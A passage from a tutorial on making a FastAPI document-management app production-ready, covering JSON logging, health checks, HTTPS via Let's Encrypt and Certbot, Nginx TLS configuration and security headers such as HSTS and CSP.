```python
print(f"User {username} logged in")
### Output: "User john logged in"
### Hard to parse, search, analyze
```

**Good logging (structured):**

```python
logger.info("User logged in", extra={
    "username": username,
    "ip": request.client.host,
    "timestamp": datetime.now().isoformat()
})
### Output: JSON - easy to parse, search, analyze
```

### Install Logging Libraries

```bash
pip install python-json-logger
```

### Configure Structured Logging

Create `backend/logging_config.py`:

```python
"""
Logging configuration for production.
"""
import logging
import sys
from pythonjsonlogger import jsonlogger
from config import settings

def setup_logging():
    """
    Configure structured JSON logging.
    """
    # Create logger
    logger = logging.getLogger()
    logger.setLevel(logging.INFO if not settings.debug else logging.DEBUG)

    # Create handler
    handler = logging.StreamHandler(sys.stdout)

    # Create JSON formatter
    formatter = jsonlogger.JsonFormatter(
        '%(asctime)s %(name)s %(levelname)s %(message)s',
        timestamp=True
    )

    handler.setFormatter(formatter)
    logger.addHandler(handler)

    return logger
```

### Update `main.py`

```python
from logging_config import setup_logging

### Setup logging on startup
logger = setup_logging()

@app.on_event("startup")
def startup_event():
    logger.info("Application starting", extra={
        "environment": "production" if not settings.debug else "development",
        "database_url": settings.database_url.split('@')[0] + '@***'  # Hide password
    })
    init_db()
```

### Log Important Events

```python
@app.post("/api/files/checkout")
async def checkout_file(request: CheckoutRequest, current_user: User = Depends(get_current_user)):
    logger.info("File checkout", extra={
        "action": "checkout",
        "filename": request.filename,
        "user": current_user.username,
        "message": request.message
    })

    # ... checkout logic ...
```

**JSON output:**

```json
{
  "asctime": "2025-10-03T20:30:45.123456Z",
  "name": "main",
  "levelname": "INFO",
  "message": "File checkout",
  "action": "checkout",
  "filename": "PN1001.mcam",
  "user": "john",
  "message": "Editing offsets"
}
```

---

## 11.7: Health Checks & Graceful Shutdown

### Health Check Endpoint

```python
from fastapi.responses import JSONResponse

@app.get("/health")
def health_check(db: Session = Depends(get_db)):
    """
    Health check endpoint for load balancers and monitoring.

    Returns 200 if healthy, 503 if unhealthy.
    """
    try:
        # Check database connection
        db.execute("SELECT 1")

        # Check Git repository
        if not settings.repo_path.exists():
            raise Exception("Git repository not found")

        return JSONResponse(
            status_code=200,
            content={
                "status": "healthy",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "version": "1.0.0"
            }
        )

    except Exception as e:
        logger.error("Health check failed", extra={"error": str(e)})
        return JSONResponse(
            status_code=503,
            content={
                "status": "unhealthy",
                "error": str(e)
            }
        )
```

### Graceful Shutdown

Handle shutdown signals properly:

```python
import signal
import sys

def signal_handler(sig, frame):
    """Handle shutdown signals gracefully."""
    logger.info("Shutdown signal received", extra={"signal": sig})

    # Close WebSocket connections
    for username in list(manager.active_connections.keys()):
        try:
            ws = manager.active_connections[username]
            ws.close(code=1001, reason="Server shutting down")
        except Exception as e:
            logger.error(f"Error closing WebSocket: {e}")

    logger.info("Shutdown complete")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)   # Ctrl+C
signal.signal(signal.SIGTERM, signal_handler)  # Docker stop
```

---

## Stage 11 Complete - Production Ready

### What You Built

You now have:

- Environment-based configuration (`.env`)
- Docker containerization
- PostgreSQL database (replacing JSON)
- Docker Compose multi-container setup
- Nginx reverse proxy
- Structured JSON logging
- Health checks
- Graceful shutdown
- Production-ready deployment

### Key Production Concepts Mastered

**Configuration:**

- 12-factor app methodology
- Environment variables
- Pydantic Settings
- Secret management

**Containerization:**

- Docker images and containers
- Dockerfile best practices
- Docker Compose orchestration
- Volume management

**Database:**

- SQLAlchemy ORM
- Database models
- Migrations with Alembic
- Connection pooling

**Deployment:**

- Nginx as reverse proxy
- Multi-container architecture
- Health checks
- Logging strategies

### Verification Checklist

- [ ] `.env` file created (not in Git!)
- [ ] Docker image builds successfully
- [ ] `docker-compose up` starts all services
- [ ] Can connect to PostgreSQL
- [ ] Database tables created
- [ ] Nginx serves static files
- [ ] Health check returns 200
- [ ] Logs are JSON formatted
- [ ] Graceful shutdown works

### Your Production Architecture

```
                    Internet
                       ↓
                   [Port 80]
                       ↓
              ┌────────────────┐
              │  Nginx         │
              │  (Reverse      │
              │   Proxy)       │
              └────────────────┘
                       ↓
              ┌────────────────┐
              │  PDM App       │
              │  (FastAPI)     │
              └────────────────┘
                       ↓
              ┌────────────────┐
              │  PostgreSQL    │
              │  (Database)    │
              └────────────────┘
```

### Deployment Commands

**Development:**

```bash
uvicorn main:app --reload
```

**Production:**

```bash
docker-compose up -d
```

#

Your app is production-ready! Potential next steps:

- **Stage 12 (Optional):** Advanced topics
  - HTTPS with Let's Encrypt
  - Kubernetes deployment
  - Redis caching
  - Celery background tasks
  - Advanced monitoring (Prometheus, Grafana)
  - Load testing
  - Blue-green deployments

You've built a complete, production-grade application from scratch. Congratulations! 🎉

---

**You've completed the PDM Tutorial! You now understand:**

✅ Python fundamentals  
✅ FastAPI and REST APIs  
✅ Frontend (HTML/CSS/JavaScript)  
✅ Git and version control  
✅ Authentication & Authorization  
✅ Real-time WebSockets  
✅ Testing with pytest  
✅ Docker & containerization  
✅ Production deployment

**You're ready to build real-world applications!**

---

### Phase 2: Advanced Features - Enterprise Capabilities

### Stage 12: HTTPS & SSL/TLS - Securing Production Traffic

## Introduction: The Goal of This Stage

Your app runs over HTTP - all traffic is **unencrypted**. Passwords, tokens, user data - everything is sent in plain text across the network. Any attacker on the network can read it all.

In this stage, you'll implement **HTTPS** with SSL/TLS certificates, encrypting all communication between clients and your server.

By the end of this stage, you will:

- Understand how HTTPS and SSL/TLS work
- Grasp the certificate authority (CA) system
- Implement Let's Encrypt for free certificates
- Configure Nginx for SSL/TLS
- Set up automatic certificate renewal
- Implement security headers (HSTS, CSP)
- Force HTTPS redirection
- Understand SSL/TLS best practices
- Test your SSL configuration
- Handle certificate errors

**Time Investment:** 4-6 hours

---

## 12.1: HTTP vs HTTPS - The Security Gap

### The Problem with HTTP

**HTTP (Hypertext Transfer Protocol):**

```
Client                    Network                    Server
  │                                                     │
  ├──── GET /api/auth/login ──────────────────────────>│
  │     username=admin                                  │
  │     password=admin123     ← Anyone can read this!  │
  │                                                     │
  │<──── access_token=eyJ... ──────────────────────────┤
  │                           ← Token exposed too!     │
```

**What attackers can do:**

- **Read credentials** - Capture usernames/passwords
- **Steal tokens** - Hijack user sessions
- **Modify requests** - Change data in transit
- **Inject content** - Insert malicious code

**Tools for this:** Wireshark, tcpdump, mitmproxy (freely available)

### HTTPS to the Rescue

**HTTPS (HTTP Secure) = HTTP + TLS (Transport Layer Security)**

```
Client                    Network                    Server
  │                                                     │
  ├──── Encrypted: aBc3F9... ────────────────────────>│
  │     (handshake establishes encryption)             │
  │                                                     │
  │<──── Encrypted: xYz7K2... ──────────────────────┤
  │     ← Gibberish to attackers!                      │
```

**What HTTPS provides:**

- ✅ **Encryption** - Data scrambled, unreadable
- ✅ **Authentication** - Verify server identity
- ✅ **Integrity** - Detect tampering

### Why HTTPS is Now Required

**Browser warnings:**

```
🔒 Secure     https://example.com  ← Good
⚠️  Not Secure  http://example.com   ← Bad (browser warning)
```

**Requirements:**

- **Chrome/Firefox** - Mark HTTP sites as "Not Secure"
- **PWAs** - Require HTTPS
- **HTTP/2** - Requires HTTPS
- **Service Workers** - Require HTTPS
- **Geolocation API** - Requires HTTPS
- **WebSockets (WSS)** - Requires HTTPS in production
- **SEO** - Google ranks HTTPS sites higher
- **Payment processors** - Require HTTPS (PCI DSS)

---

## 12.2: How SSL/TLS Works - The Handshake

### SSL vs TLS - Terminology

**History:**

- **SSL 1.0** - Never released (security flaws)
- **SSL 2.0** - 1995 (deprecated, insecure)
- **SSL 3.0** - 1996 (deprecated, insecure)
- **TLS 1.0** - 1999 (SSL's successor, deprecated 2020)
- **TLS 1.1** - 2006 (deprecated 2020)
- **TLS 1.2** - 2008 (current standard)
- **TLS 1.3** - 2018 (latest, faster, more secure)

**Common usage:**

- People say "SSL certificate" but mean "TLS certificate"
- We'll use "TLS" (technically correct) and "SSL/TLS" (common parlance)

### The TLS Handshake (Simplified)

**Step-by-step:**

**1. Client Hello**

```
Client → Server:
"Hi! I support TLS 1.2 and TLS 1.3.
I can use these cipher suites: AES-GCM, ChaCha20-Poly1305..."
```

**2. Server Hello**

```
Server → Client:
"Let's use TLS 1.3 with AES-256-GCM.
Here's my certificate (proves I'm really example.com)."
```

**3. Certificate Verification**

```
Client checks:
1. Is certificate signed by a trusted CA? ✓
2. Is certificate for the domain I'm visiting? ✓
3. Is certificate not expired? ✓
```

**4. Key Exchange**

```
Client and Server:
Use public-key cryptography (RSA or ECDH) to agree on a
shared secret key, without ever transmitting the key itself!
```

**5. Encrypted Communication**

```
All further communication encrypted with the shared secret key.
```

### Public Key Cryptography (Asymmetric)

**The magic that makes TLS work:**

```python
### Server has two keys:
private_key  # Keep secret! Never share!
public_key   # Share with everyone

### Encryption:
encrypted = encrypt(data, public_key)
### Only private_key can decrypt it!

decrypted = decrypt(encrypted, private_key)

### Anyone can encrypt, only server can decrypt
```

**Real-world analogy:**

- **Public key** = Your mailbox (anyone can drop letters in)
- **Private key** = Your mailbox key (only you can open it)

### Certificate Authority (CA) System

**The trust chain:**

```
┌─────────────────────────────┐
│  Root CA                    │  ← Trusted by browsers
│  (e.g., DigiCert)           │     (pre-installed)
└─────────────────────────────┘
              │
              │ signs
              ↓
┌─────────────────────────────┐
│  Intermediate CA            │
│  (e.g., Let's Encrypt)      │
└─────────────────────────────┘
              │
              │ signs
              ↓
┌─────────────────────────────┐
│  Your Certificate           │
│  (example.com)              │
└─────────────────────────────┘
```

**How browsers verify:**

1. Browser receives your certificate
2. Certificate says: "Signed by Let's Encrypt"
3. Browser checks: "Do I trust Let's Encrypt?"
4. Let's Encrypt certificate says: "Signed by IdenTrust"
5. Browser checks: "Do I trust IdenTrust?"
6. IdenTrust is a root CA → YES, trusted!
7. Chain complete → Your certificate is trusted!

**If any link breaks:** Browser shows scary warning

---

## 12.3: Let's Encrypt - Free SSL Certificates

### What is Let's Encrypt?

**Let's Encrypt** is a free, automated, and open Certificate Authority.

**Before Let's Encrypt (pre-2016):**

- Buy certificate: $50-$500/year
- Manual process: Generate CSR, submit, wait, install
- Renewal: Manual every year

**With Let's Encrypt:**

- Free certificates
- Automated issuance (90 seconds)
- Automated renewal
- Command-line tool (Certbot)

**The catch:**

- Certificates expire every **90 days** (not 1 year)
- Must renew frequently
- But renewal is automated! (so this is actually better)

### How Let's Encrypt Verifies Domain Ownership

**ACME Protocol (Automatic Certificate Management Environment):**

**HTTP-01 Challenge:**

```
1. You: "I want a certificate for example.com"

2. Let's Encrypt: "Prove you control example.com:
   Create this file at:
   http://example.com/.well-known/acme-challenge/random123
   with this content: token456"

3. You: Create the file

4. Let's Encrypt: Fetch the file
   - File exists? ✓
   - Content matches? ✓
   - You control the domain! Issue certificate.
```

**DNS-01 Challenge:**

```
1. You: "I want a certificate for example.com"

2. Let's Encrypt: "Prove you control example.com:
   Create this DNS TXT record:
   _acme-challenge.example.com = token456"

3. You: Create DNS record

4. Let's Encrypt: Query DNS
   - Record exists? ✓
   - Content matches? ✓
   - You control the domain! Issue certificate.
```

**HTTP-01** is easier for most cases. **DNS-01** is required for wildcards (\*.example.com).

---

## 12.4: Installing Certbot

### Prerequisites

You need a **domain name** pointing to your server.

**Get a domain:**

- Namecheap, GoDaddy, Google Domains, etc.
- Cost: ~$10-15/year

**Point domain to server:**

```
DNS A Record:
example.com      →  YOUR_SERVER_IP
www.example.com  →  YOUR_SERVER_IP
```

**Verify DNS propagation:**

```bash
dig example.com
### Should show your server IP
```

### Install Certbot

**Ubuntu/Debian:**

```bash
sudo apt update
sudo apt install certbot python3-certbot-nginx
```

**macOS (for local testing with domain):**

```bash
brew install certbot
```

**Docker (we'll use this):**

```yaml
### Add to docker-compose.yml
services:
  certbot:
    image: certbot/certbot
    volumes:
      - ./certbot/conf:/etc/letsencrypt
      - ./certbot/www:/var/www/certbot
    entrypoint: "/bin/sh -c 'trap exit TERM; while :; do certbot renew; sleep 12h & wait $${!}; done;'"
```

---

## 12.5: Obtaining SSL Certificate

### Update Nginx for ACME Challenge

Update `backend/nginx.conf`:

```nginx
events {
    worker_connections 1024;
}

http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    upstream pdm_app {
        server app:8000;
    }

    server {
        listen 80;
        server_name example.com www.example.com;  # Replace with your domain

        # ACME challenge for Let's Encrypt
        location /.well-known/acme-challenge/ {
            root /var/www/certbot;
        }

        # Redirect all other traffic to HTTPS
        location / {
            return 301 https://$server_name$request_uri;
        }
    }

    server {
        listen 443 ssl http2;
        server_name example.com www.example.com;

        # SSL certificates (will be created by certbot)
        ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;

        # SSL configuration (modern, secure)
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384';
        ssl_prefer_server_ciphers off;

        # SSL session optimization
        ssl_session_cache shared:SSL:10m;
        ssl_session_timeout 10m;

        # OCSP stapling
        ssl_stapling on;
        ssl_stapling_verify on;
        ssl_trusted_certificate /etc/letsencrypt/live/example.com/chain.pem;

        # Static files
        location /static/ {
            alias /usr/share/nginx/html/;
            expires 7d;
            add_header Cache-Control "public, immutable";
        }

        # Proxy API requests
        location / {
            proxy_pass http://pdm_app;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;

            # WebSocket support
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
        }
    }
}
```

### Update docker-compose.yml

Update `backend/docker-compose.yml`:

```yaml
version: "3.8"

services:
  db:
    image: postgres:15
    container_name: pdm-db
    environment:
      POSTGRES_USER: pdm_user
      POSTGRES_PASSWORD: pdm_password
      POSTGRES_DB: pdm_db
    volumes:
      - postgres_data:/var/lib/postgresql/data
    ports:
      - "5432:5432"
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U pdm_user"]
      interval: 10s
      timeout: 5s
      retries: 5

  app:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: pdm-app
    environment:
      - DEBUG=false
      - SECRET_KEY=${SECRET_KEY}
      - DATABASE_URL=postgresql://pdm_user:pdm_password@db:5432/pdm_db
      - GITLAB_URL=${GITLAB_URL}
      - GITLAB_TOKEN=${GITLAB_TOKEN}
    volumes:
      - ./git_repo:/app/git_repo
      - ./static:/app/static
    ports:
      - "8000:8000"
    depends_on:
      db:
        condition: service_healthy
    restart: unless-stopped

  nginx:
    image: nginx:alpine
    container_name: pdm-nginx
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
      - ./static:/usr/share/nginx/html:ro
      - ./certbot/conf:/etc/letsencrypt:ro
      - ./certbot/www:/var/www/certbot:ro
    ports:
      - "80:80"
      - "443:443"
    depends_on:
      - app
    restart: unless-stopped
    command: '/bin/sh -c ''while :; do sleep 6h & wait $${!}; nginx -s reload; done & nginx -g "daemon off;"'''

  certbot:
    image: certbot/certbot
    container_name: pdm-certbot
    volumes:
      - ./certbot/conf:/etc/letsencrypt
      - ./certbot/www:/var/www/certbot
    entrypoint: "/bin/sh -c 'trap exit TERM; while :; do certbot renew; sleep 12h & wait $${!}; done;'"

volumes:
  postgres_data:
```

### Create Directories

```bash
cd backend
mkdir -p certbot/conf certbot/www
```

### Initial Certificate Request

**First, start nginx without SSL:**

Temporarily comment out the `server` block listening on 443 in `nginx.conf` (we need the cert before we can reference it).

```bash
docker-compose up -d nginx
```

**Request certificate:**

```bash
docker-compose run --rm certbot certonly \
  --webroot \
  --webroot-path=/var/www/certbot \
  --email your-email@example.com \
  --agree-tos \
  --no-eff-email \
  -d example.com \
  -d www.example.com
```

**What this does:**

- `certonly` - Get certificate, don't install
- `--webroot` - Use HTTP-01 challenge
- `--webroot-path` - Where to place challenge files
- `--email` - For renewal notices
- `--agree-tos` - Agree to Let's Encrypt terms
- `-d` - Domain(s) to certify

**Output:**

```
Congratulations! Your certificate has been saved at:
/etc/letsencrypt/live/example.com/fullchain.pem
Your key file has been saved at:
/etc/letsencrypt/live/example.com/privkey.pem
Your cert will expire on 2026-01-01.
```

**Now uncomment the SSL server block in `nginx.conf` and restart:**

```bash
docker-compose restart nginx
```

**Test:**

```
https://example.com
```

You should see 🔒 Secure in your browser!

---

## 12.6: Understanding SSL Certificate Files

### What Let's Encrypt Creates

```
certbot/conf/live/example.com/
├── fullchain.pem     ← Use this for ssl_certificate
├── privkey.pem       ← Use this for ssl_certificate_key
├── chain.pem         ← Intermediate cert chain
└── cert.pem          ← Your certificate only
```

**File explanations:**

**`privkey.pem`** - Your private key

- **Keep secret!** Never share, never commit to Git
- If compromised, attacker can impersonate your server

**`cert.pem`** - Your certificate

- Contains: Your public key, domain name, expiration date
- Signed by Let's Encrypt

**`chain.pem`** - Intermediate certificates

- Let's Encrypt → IdenTrust chain
- Browsers use this to verify trust

**`fullchain.pem`** - `cert.pem` + `chain.pem`

- Most servers need this (includes full chain)

### Nginx SSL Directives Explained

```nginx
ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
```

**The certificate and key must match!** They're a cryptographic pair.

```nginx
ssl_protocols TLSv1.2 TLSv1.3;
```

**Only allow modern TLS versions:**

- TLSv1.0, TLSv1.1 - Disabled (insecure)
- TLSv1.2 - Supported (current standard)
- TLSv1.3 - Supported (latest, fastest)

```nginx
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:...';
```

**Cipher suites** - encryption algorithms

**Good cipher properties:**

- **ECDHE** - Elliptic Curve Diffie-Hellman Ephemeral (perfect forward secrecy)
- **AES-GCM** - Advanced Encryption Standard in GCM mode (authenticated encryption)
- **SHA256/SHA384** - Secure hash algorithms

**Bad ciphers (disabled):**

- RC4, MD5, DES - Broken/weak
- Non-ECDHE - No forward secrecy

```nginx
ssl_prefer_server_ciphers off;
```

**TLS 1.3:** Let client choose (they know their hardware)
**TLS 1.2:** Server should choose (more secure ciphers)

```nginx
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 10m;
```

**Session resumption** - performance optimization

- Cache SSL sessions for 10 minutes
- Subsequent connections skip expensive handshake
- 10MB cache ≈ 40,000 sessions

```nginx
ssl_stapling on;
ssl_stapling_verify on;
```

**OCSP Stapling:**

- OCSP = Online Certificate Status Protocol
- Checks if certificate is revoked
- **Without stapling:** Browser contacts CA (slow, privacy leak)
- **With stapling:** Server includes OCSP response (fast, private)

---

## 12.7: Security Headers

### Add Security Headers to Nginx

Update the `server` block in `nginx.conf`:

```nginx
server {
    listen 443 ssl http2;
    server_name example.com www.example.com;

    # ... SSL configuration ...

    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' wss://example.com" always;

    # ... rest of configuration ...
}
```

### Understanding Security Headers

**1. HSTS (Strict-Transport-Security)**

```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

**What it does:**

- Tells browser: "Always use HTTPS for this domain"
- Even if user types `http://example.com`, browser converts to HTTPS
- Prevents SSL stripping attacks

**Parameters:**

- `max-age=31536000` - Remember for 1 year (seconds)
- `includeSubDomains` - Apply to all subdomains
- `preload` - Include in browser's preload list (hardcoded HTTPS-only)

**HSTS Preload:**

- Submit your domain to: <https://hstspreload.org/>
- Chrome, Firefox, Safari will always use HTTPS
- Even on first visit (no initial HTTP request)

**2. X-Content-Type-Options**

```nginx
add_header X-Content-Type-Options "nosniff" always;
```

**Prevents MIME sniffing attacks:**

**Attack scenario:**

```
1. Attacker uploads "image.jpg" (actually contains JavaScript)
2. Browser ignores Content-Type: image/jpeg
3. Browser "sniffs" content, detects JavaScript
4. Browser executes malicious code
```

**With nosniff:**

- Browser trusts server's Content-Type header
- Won't execute image.jpg as JavaScript

**3. X-Frame-Options**

```nginx
add_header X-Frame-Options "SAMEORIGIN" always;
```

**Prevents clickjacking:**

**Attack:**

```html
<!-- Attacker's site -->
<iframe src="https://yourbank.com/transfer"></iframe>
<!-- Invisible frame positioned over "Click to win!" button -->
<!-- User thinks they're clicking game, actually transferring money -->
```

**Options:**

- `DENY` - Never allow framing
- `SAMEORIGIN` - Only allow same-origin framing
- `ALLOW-FROM uri` - Allow specific origin (deprecated)

**4. X-XSS-Protection**

```nginx
add_header X-XSS-Protection "1; mode=block" always;
```

**Legacy XSS filter:**

- Older browsers had XSS filters
- `1; mode=block` - Enable and block on detection
- **Modern approach:** Use CSP instead

**5. Referrer-Policy**

```nginx
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

**Controls Referer header:**

**Options:**

- `no-referrer` - Never send
- `same-origin` - Only to same origin
- `strict-origin-when-cross-origin` - Send origin only to other sites

**Privacy benefit:**

```
User on: https://example.com/admin/secret-project
Clicks link to: https://external.com

Without policy:
Referer: https://example.com/admin/secret-project  ← Leak!

With strict-origin-when-cross-origin:
Referer: https://example.com  ← Safe
```

**6. Content Security Policy (CSP)**

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; ..." always;
```

**Most powerful security header - prevents XSS:**

**Directives:**

```
default-src 'self'          - Default: only load from same origin
script-src 'self'           - JavaScript only from same origin
style-src 'self'            - CSS only from same origin
img-src 'self' data: https: - Images from same origin, data URIs, any HTTPS
connect-src 'self' wss:     - AJAX/WebSocket only to same origin or WSS
```

**`'unsafe-inline'` caveat:**

```nginx
script-src 'self' 'unsafe-inline'
```

This allows `<script>` tags in HTML. **Not ideal** (vulnerable to XSS).

**Better approach (without 'unsafe-inline'):**

- Move all JavaScript to external `.js` files
- Use nonces or hashes for unavoidable inline scripts

**Example with nonce:**

```nginx
add_header Content-Security-Policy "script-src 'self' 'nonce-$request_id'" always;
```

```html
<script nonce="abc123">
  console.log("This is allowed");
</script>

<script>
  console.log("This is BLOCKED");
</script>
```

---

## 12.8: Testing SSL Configuration

### Online SSL Test

**SSL Labs Test:**

```
https://www.ssllabs.com/ssltest/analyze.html?d=example.com
```

**What it checks:**

- Certificate validity
- Protocol support
- Cipher strength
- Vulnerabilities (POODLE, BEAST, etc.)
- Certificate chain

**Goal:** **A+ rating**

### Command-Line Testing

**Test certificate:**

```bash
openssl s_client -connect example.com:443 -servername example.com
```

**Test specific TLS version:**

```bash
### Should work (TLS 1.2)
openssl s_client -connect example.com:443 -tls1_2

### Should work (TLS 1.3)
openssl s_client -connect example.com:443 -tls1_3

### Should FAIL (TLS 1.0 disabled)
openssl s_client -connect example.com:443 -tls1
```

**Check certificate expiration:**

```bash
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates
```

### Browser Developer Tools

**Chrome DevTools:**

1. Open DevTools (F12)
2. Security tab
3. View certificate
4. Check "Connection" section

**Look for:**

- ✅ Valid certificate
- ✅ Secure connection (TLS 1.2 or 1.3)
- ✅ Strong cipher suite
- ❌ Mixed content warnings

### Mixed Content

**The problem:**

```html
<!-- HTTPS page -->
<script src="http://example.com/script.js"></script>
<!--           ↑ HTTP! Mixed content! -->
```

**Browser blocks this:**

- HTTPS page loading HTTP resources = security hole
- Attacker can modify HTTP content

**Solution:** Use HTTPS for all resources:

```html
<script src="https://example.com/script.js"></script>
<!-- Or protocol-relative: -->
<script src="//example.com/script.js"></script>
```

---

## 12.9: Automatic Certificate Renewal

### Why Renewal Matters

**Let's Encrypt certificates expire after 90 days.**

**If certificate expires:**

- Browser shows error: "Your connection is not private"
- Users can't access your site
- Emergency scramble to renew

**Solution:** Automate renewal

### Certbot Renewal

**Our Docker Compose already handles this!**

```yaml
certbot:
  image: certbot/certbot
  entrypoint: "/bin/sh -c 'trap exit TERM; while :; do certbot renew; sleep 12h & wait $${!}; done;'"
```

**What this does:**

- Runs `certbot renew` every 12 hours
- Certbot checks if renewal needed (≤30 days until expiry)
- If needed, renews certificate
- If not needed, does nothing

**Nginx reload:**

```yaml
nginx:
  command: '/bin/sh -c ''while :; do sleep 6h & wait $${!}; nginx -s reload; done & nginx -g "daemon off;"'''
```

**What this does:**

- Reloads Nginx every 6 hours
- Picks up new certificates
- No downtime (graceful reload)

### Manual Renewal (Testing)

**Dry run (test without actually renewing):**

```bash
docker-compose run --rm certbot renew --dry-run
```

**Force renewal (for testing):**

```bash
docker-compose run --rm certbot renew --force-renewal
```

**Check certificate status:**

```bash
docker-compose run --rm certbot certificates
```

### Monitoring Certificate Expiration

**Set up monitoring:**

Create `backend/check_cert_expiry.py`:

```python
"""
Check SSL certificate expiration and alert if < 30 days.
Run this as a cron job or in CI.
"""
import ssl
import socket
from datetime import datetime, timezone
import sys

def check_cert_expiry(hostname, port=443):
    """Check SSL certificate expiration."""
    context = ssl.create_default_context()

    with socket.create_connection((hostname, port)) as sock:
        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
            cert = ssock.getpeercert()

            # Parse expiration date
            not_after = cert['notAfter']
            expire_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
            expire_date = expire_date.replace(tzinfo=timezone.utc)

            # Calculate days until expiry
            now = datetime.now(timezone.utc)
            days_remaining = (expire_date - now).days

            print(f"Certificate expires: {expire_date}")
            print(f"Days remaining: {days_remaining}")

            # Alert if < 30 days
            if days_remaining < 30:
                print("⚠️  WARNING: Certificate expires soon!")
                sys.exit(1)
            else:
                print("✅ Certificate is valid")
                sys.exit(0)

if __name__ == "__main__":
    check_cert_expiry("example.com")
```

**Run daily via cron:**

```bash
0 9 * * * /usr/bin/python3 /path/to/check_cert_expiry.py
```

---

## 12.10: Update Frontend for HTTPS

### Update WebSocket Connection

Update `static/js/app.js`:

```javascript
function connectWebSocket() {
  const token = localStorage.getItem("access_token");
  if (!token) {
    console.log("No token, skipping WebSocket connection");
    return;
  }

  // Determine WebSocket URL based on page protocol
  const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
  const wsUrl = `${protocol}//${window.location.host}/ws?token=${token}`;

  console.log("Connecting to WebSocket:", wsUrl);

  // ... rest of WebSocket code ...
}
```

**Key change:** `wss:` (WebSocket Secure) instead of `ws:`

### Update CORS Settings

Update `backend/config.py`:

```python
cors_origins: list = Field(
    default=["https://example.com"],
    env="CORS_ORIGINS"
)
```

Update `.env`:

```bash
CORS_ORIGINS=https://example.com,https://www.example.com
```

### Update FastAPI CORS

Update `backend/main.py`:

```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

---

## Stage 12 Complete - Secure HTTPS Deployment

### What You Built

You now have:

- HTTPS encryption with TLS 1.2/1.3
- Free SSL certificate from Let's Encrypt
- Automatic certificate renewal
- Security headers (HSTS, CSP, etc.)
- HTTP → HTTPS redirection
- A+ SSL Labs rating
- Secure WebSocket (WSS) connection
- Production-ready security

### Key Security Concepts Mastered

**SSL/TLS:**

- Public key cryptography
- TLS handshake process
- Certificate authorities
- Certificate chain verification

**Let's Encrypt:**

- ACME protocol
- HTTP-01 and DNS-01 challenges
- Certificate files (fullchain, privkey)
- Automated renewal

**Nginx SSL:**

- SSL directives
- Cipher suites
- Session caching
- OCSP stapling

**Security Headers:**

- HSTS (force HTTPS)
- CSP (prevent XSS)
- X-Frame-Options (prevent clickjacking)
- Other protective headers

### Verification Checklist

- [ ] HTTPS works at <https://example.com>
- [ ] Browser shows 🔒 secure icon
- [ ] HTTP redirects to HTTPS
- [ ] No mixed content warnings
- [ ] WebSocket uses WSS
- [ ] SSL Labs test shows A/A+
- [ ] Certificate auto-renewal configured
- [ ] Security headers present
- [ ] Certificate expires in ~90 days

### Security Best Practices Applied

✅ **Encryption** - All traffic encrypted  
✅ **Strong ciphers** - Modern TLS 1.2/1.3 only  
✅ **Perfect forward secrecy** - ECDHE ciphers  
✅ **HSTS** - Force HTTPS  
✅ **Security headers** - Defense in depth  
✅ **Automated renewal** - No manual intervention  
✅ **Monitoring** - Alert on expiration

### Common SSL Issues & Solutions

**Issue:** "Certificate not trusted"

- **Cause:** Incomplete certificate chain
- **Fix:** Use `fullchain.pem`, not `cert.pem`

**Issue:** "Mixed content blocked"

- **Cause:** HTTPS page loading HTTP resources
- **Fix:** Update all resources to HTTPS

**Issue:** "Certificate expired"

- **Cause:** Renewal failed
- **Fix:** Check certbot logs, verify webroot path

**Issue:** "Wrong host"

- **Cause:** Certificate for wrong domain
- **Fix:** Ensure `-d example.com` matches your domain

#

In **Stage 13**, we'll add **Redis Caching**:

- Cache frequently accessed data
- Session storage
- Rate limiting
- Background job queues
- Real-time analytics
- Massive performance improvements

Your app is now secure with HTTPS! Next, we'll make it blazingly fast.

---

**Copy this into MkDocs. When ready, request Stage 13.**
